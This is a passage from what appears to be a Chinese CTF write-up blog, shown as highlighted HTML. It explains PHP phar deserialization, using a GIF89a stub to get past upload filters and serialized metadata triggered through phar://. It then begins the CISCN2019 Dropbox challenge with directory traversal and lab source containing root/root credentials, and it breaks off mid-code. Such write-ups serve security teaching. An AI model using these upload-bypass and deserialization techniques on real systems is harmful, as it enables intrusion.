<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> -&gt; </span><span style="color:#dcdcaa">setStub</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"GIF89a"</span><span style="color:#d4d4d4">.</span><span style="color:#ce9178">"&lt;?php __HALT_COMPILER(); ?&gt;"</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">//设置stub，为固定格式</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> -&gt; </span><span style="color:#dcdcaa">setMetadata</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">//把我们的对象写进Metadata中，漏洞利用重点所在</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> -&gt; </span><span style="color:#dcdcaa">addFromString</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"test.txt"</span><span style="color:#d4d4d4">,</span><span style="color:#ce9178">"hello world!!"</span><span style="color:#d4d4d4">);</span><span style="color:#6a9955">//写压缩文件的内容，这里没利用点，可以随便写</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$phar</span><span style="color:#d4d4d4"> -&gt; </span><span style="color:#dcdcaa">stopBuffering</span><span style="color:#d4d4d4">();</span><span style="color:#6a9955">//停止缓冲</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p>在上传场景中，我们可以将 phar 伪造成其他格式的文件。识别 phar 文件只需添加这个文件头就可以了。那我们就可以添加别的文件头进行伪造了。例如 $phar-&gt;setStub ("GIF89a".""); 添加 gif 的文件头绕过上传机制。</p> <p>运行完成会在当前目录生成一个文件 ---test.phar</p> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447274.png" alt="image-20221019144043718"></p> <p>可以看到，自己构造的 test 类被序列化了。再试一下能不能反序列化。</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">test</span><span style="color:#d4d4d4">{</span></span>
<span class="line"><span style="color:#d4d4d4">   </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__destruct</span><span style="color:#d4d4d4">()</span><span style="color:#6a9955">//对象在反序列化时自动触发</span></span>
<span class="line"><span style="color:#d4d4d4">     {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">str</span><span style="color:#d4d4d4">;</span><span style="color:#6a9955">//检验是否进行了反序列化</span></span>
<span class="line"><span style="color:#d4d4d4">     }</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4"> =  </span><span style="color:#ce9178">"phar://test.phar/test.txt"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4">(</span><span style="color:#dcdcaa">file_get_contents</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447332.png" alt="image-20221019144532188"></p> <p>可以看到用 phar 伪协议能够正常读取，代表 Meta-data 中的数据能被正常反序列化。 php 一大部分的文件系统函数在通过 <code>phar://</code> 伪协议解析 phar 文件时，都会将 meta-data 进行反序列化，受影响的函数如下：<img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221447510.png" alt="image-20221019145705074"></p> <p>来个例题巩固一下</p> <h3 id="ciscn2019-华北赛区-day1-web1dropbox"><a class="markdownIt-Anchor" href="#ciscn2019-华北赛区-day1-web1dropbox"></a> [CISCN2019 华北赛区 Day1 Web1] Dropbox</h3> <p>打开页面发现注册框和登录框，先试一下万能密码和 sql 注入。无果后直接注册登录，发现了文件上传的地方。尝试常见的文件上传绕过，经过一系列尝试，发现通过修改 mime 文件头能狗传上 php 文件，但是文件类型被改成了 jpg，代表不能利用，传不上马。然后发现了文件下载的按钮，尝试目录穿越，任意文件包含。果然存在，但没啥用，找了半天找不到 flag。</p> <p><img src= "/img/loading/loading.gif" data-lazy-src="https://gitee.com/CSJ021005/f0ur_lin_-picgo/raw/master/202507221448359.png" alt="image-20221019161139768"></p> <p>然后就想着把知道的文件的源码下载下来，首先是 download.php，发现不存在，可能文件在上传文件的父目录，尝试过后是../../ 在两级目录。</p> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#6a9955">//download.php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">session_start</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_SESSION</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'login'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Location: login.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'filename'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"class.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#dcdcaa">ini_set</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"open_basedir"</span><span style="color:#d4d4d4">, </span><span style="color:#dcdcaa">getcwd</span><span style="color:#d4d4d4">() </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">":/etc:/tmp"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#dcdcaa">chdir</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_SESSION</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'sandbox'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">File</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4"> = (</span><span style="color:#569cd6">string</span><span style="color:#d4d4d4">) </span><span style="color:#9cdcfe">$_POST</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'filename'</span><span style="color:#d4d4d4">];</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#dcdcaa">strlen</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) &lt; </span><span style="color:#b5cea8">40</span><span style="color:#d4d4d4"> &amp;&amp; </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">open</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">) &amp;&amp; </span><span style="color:#dcdcaa">stristr</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">, </span><span style="color:#ce9178">"flag"</span><span style="color:#d4d4d4">) === </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">Header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Content-type: application/octet-stream"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">Header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Content-Disposition: attachment; filename="</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">basename</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$filename</span><span style="color:#d4d4d4">));</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$file</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">close</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">} </span><span style="color:#c586c0">else</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"File not exist"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#6a9955">//index.php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">session_start</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (!</span><span style="color:#dcdcaa">isset</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_SESSION</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'login'</span><span style="color:#d4d4d4">])) {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#dcdcaa">header</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"Location: login.php"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#c586c0">die</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">}</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;!DOCTYPE html&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;html&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;meta charset=</span><span style="color:#ce9178">"utf-8"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;meta name=</span><span style="color:#ce9178">"viewport"</span><span style="color:#d4d4d4"> content=</span><span style="color:#ce9178">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;title&gt;网盘管理&lt;/title&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;head&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;link href=</span><span style="color:#ce9178">"static/css/bootstrap.min.css"</span><span style="color:#d4d4d4"> rel=</span><span style="color:#ce9178">"stylesheet"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;link href=</span><span style="color:#ce9178">"static/css/panel.css"</span><span style="color:#d4d4d4"> rel=</span><span style="color:#ce9178">"stylesheet"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;script src=</span><span style="color:#ce9178">"static/js/jquery.min.js"</span><span style="color:#d4d4d4">&gt;&lt;/script&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;script src=</span><span style="color:#ce9178">"static/js/bootstrap.bundle.min.js"</span><span style="color:#d4d4d4">&gt;&lt;/script&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;script src=</span><span style="color:#ce9178">"static/js/toast.js"</span><span style="color:#d4d4d4">&gt;&lt;/script&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;script src=</span><span style="color:#ce9178">"static/js/panel.js"</span><span style="color:#d4d4d4">&gt;&lt;/script&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/head&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;body&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;nav aria-label=</span><span style="color:#ce9178">"breadcrumb"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;ol </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"breadcrumb"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        &lt;li </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"breadcrumb-item active"</span><span style="color:#d4d4d4">&gt;管理面板&lt;/li&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        &lt;li </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"breadcrumb-item active"</span><span style="color:#d4d4d4">&gt;&lt;label </span><span style="color:#c586c0">for</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"fileInput"</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"fileLabel"</span><span style="color:#d4d4d4">&gt;上传文件&lt;/label&gt;&lt;/li&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">        &lt;li </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"active ml-auto"</span><span style="color:#d4d4d4">&gt;&lt;a href=</span><span style="color:#ce9178">"#"</span><span style="color:#d4d4d4">&gt;你好 &lt;?php </span><span style="color:#dcdcaa">echo</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$_SESSION</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'username'</span><span style="color:#d4d4d4">]?&gt;&lt;/a&gt;&lt;/li&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">    &lt;/ol&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;/nav&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;input type=</span><span style="color:#ce9178">"file"</span><span style="color:#d4d4d4"> id=</span><span style="color:#ce9178">"fileInput"</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"hidden"</span><span style="color:#d4d4d4">&gt;</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;div </span><span style="color:#569cd6">class</span><span style="color:#d4d4d4">=</span><span style="color:#ce9178">"top"</span><span style="color:#d4d4d4"> id=</span><span style="color:#ce9178">"toast-container"</span><span style="color:#d4d4d4">&gt;&lt;/div&gt;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#c586c0">include</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"class.php"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">FileList</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$_SESSION</span><span style="color:#d4d4d4">[</span><span style="color:#ce9178">'sandbox'</span><span style="color:#d4d4d4">]);</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">Name</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#9cdcfe">$a</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">Size</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">?&gt;</span></span></code></pre></div></div></figure> <figure class="php shiki"><div class="codeblock"><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br></pre></div><div class="code"><pre class="dark-plus shiki"><code><span class="line"><span style="color:#6a9955">//class.php</span></span>
<span class="line"><span style="color:#d4d4d4">&lt;?php</span></span>
<span class="line"><span style="color:#dcdcaa">error_reporting</span><span style="color:#d4d4d4">(</span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#9cdcfe">$dbaddr</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"127.0.0.1"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$dbuser</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"root"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$dbpass</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"root"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$dbname</span><span style="color:#d4d4d4"> = </span><span style="color:#ce9178">"dropbox"</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#9cdcfe">$db</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">new</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">mysqli</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$dbaddr</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$dbuser</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$dbpass</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$dbname</span><span style="color:#d4d4d4">);</span></span>
<span class="line"></span>
<span class="line"><span style="color:#569cd6">class</span><span style="color:#d4d4d4"> </span><span style="color:#4ec9b0">User</span><span style="color:#d4d4d4"> {</span></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$db</span><span style="color:#d4d4d4">;</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">__construct</span><span style="color:#d4d4d4">() {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">global</span><span style="color:#d4d4d4"> </span><span style="color:#9cdcfe">$db</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">db</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$db</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">user_exist</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">db</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">prepare</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">SELECT</span><span style="color:#ce9178"> `username` </span><span style="color:#569cd6">FROM</span><span style="color:#ce9178"> `users` </span><span style="color:#569cd6">WHERE</span><span style="color:#ce9178"> `username` </span><span style="color:#d4d4d4">=</span><span style="color:#ce9178"> ? </span><span style="color:#569cd6">LIMIT</span><span style="color:#ce9178"> </span><span style="color:#b5cea8">1</span><span style="color:#ce9178">;"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">bind_param</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"s"</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">execute</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">store_result</span><span style="color:#d4d4d4">();</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$count</span><span style="color:#d4d4d4"> = </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">num_rows</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#9cdcfe">$count</span><span style="color:#d4d4d4"> === </span><span style="color:#b5cea8">0</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">true</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">    }</span></span>
<span class="line"></span>
<span class="line"><span style="color:#d4d4d4">    </span><span style="color:#569cd6">public</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">function</span><span style="color:#d4d4d4"> </span><span style="color:#dcdcaa">add_user</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">, </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4">) {</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#c586c0">if</span><span style="color:#d4d4d4"> (</span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">user_exist</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$username</span><span style="color:#d4d4d4">)) {</span></span>
<span class="line"><span style="color:#d4d4d4">            </span><span style="color:#c586c0">return</span><span style="color:#d4d4d4"> </span><span style="color:#569cd6">false</span><span style="color:#d4d4d4">;</span></span>
<span class="line"><span style="color:#d4d4d4">        }</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> = </span><span style="color:#dcdcaa">sha1</span><span style="color:#d4d4d4">(</span><span style="color:#9cdcfe">$password</span><span style="color:#d4d4d4"> </span><span style="color:#d4d4d4">.</span><span style="color:#d4d4d4"> </span><span style="color:#ce9178">"SiAchGHmFx"</span><span style="color:#d4d4d4">);</span></span>
<span class="line"><span style="color:#d4d4d4">        </span><span style="color:#9cdcfe">$stmt</span><span style="color:#d4d4d4"> = </span><span style="color:#569cd6">$this</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#9cdcfe">db</span><span style="color:#d4d4d4">-&gt;</span><span style="color:#dcdcaa">prepare</span><span style="color:#d4d4d4">(</span><span style="color:#ce9178">"</span><span style="color:#569cd6">INSERT INTO</span><span style="color:#ce9178"> `users` (`id`, `username`, `password`) </span><span style="color:#569cd6">VALUES</span><span style="color:#ce9178"> (</span><span style="color:#569cd6">NULL</span><span style="color:#ce9178">, ?, ?);"</span><span style="color:#d4d4d4">);</span></span>
